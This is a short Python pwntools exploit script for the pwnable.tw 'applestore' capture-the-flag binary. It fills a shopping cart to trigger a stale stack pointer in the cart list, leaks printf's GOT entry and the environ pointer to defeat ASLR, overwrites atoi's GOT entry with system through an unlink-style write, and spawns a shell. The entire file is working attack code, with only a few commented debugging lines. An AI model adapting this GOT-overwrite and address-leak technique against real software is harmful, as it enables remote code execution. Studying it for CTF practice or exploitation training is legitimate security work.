from pwn import *


#7 18 1 0


#p = process("./applestore")
p = remote("chall.pwnable.tw", 10104)
elf = ELF("./applestore")
l = ELF("./libc_32.so.6")
#l = ELF("./libc-2.31.so")

def add(num):
	p.sendlineafter(">","2")
	p.sendlineafter(">",num)

def LIST(payload):
	p.sendlineafter(">","4")
	p.sendlineafter("y/n",payload)

for i in range(7):
	add("1")
for i in range(18):
	add("2")
add("4")

p.sendlineafter(">","5")
p.sendlineafter(">","y")

printf_got = elf.got['printf']
payload = b'y\x00'
payload += p32(printf_got)
payload += p32(0)
payload += p32(0)

LIST(payload)

p.recvuntil("27: ")




libc_base = u32(p.recv(4)) - l.sym['printf']
environ = libc_base + l.sym['environ']
system = libc_base + l.sym['system']


print("libc_base : " + hex(libc_base))
print("environ : " + hex(environ))



payload = b'y\x00'
payload += p32(environ)
payload += p32(0)
payload += p32(0)

LIST(payload)

p.recvuntil("27: ")
stack_env = u32(p.recv(4))
print("stack_env : " + hex(stack_env))
rbp = stack_env - 0x104



payload = b'27'
payload += p32(0)
payload += p32(0)
payload += p32(rbp-0xc)
payload += p32(elf.got['atoi'] + 0x22)

#gdb.attach(p)
p.sendlineafter(">","3")
p.sendafter(">",payload)

p.sendlineafter(">",p32(system) + b';sh;')

p.interactive()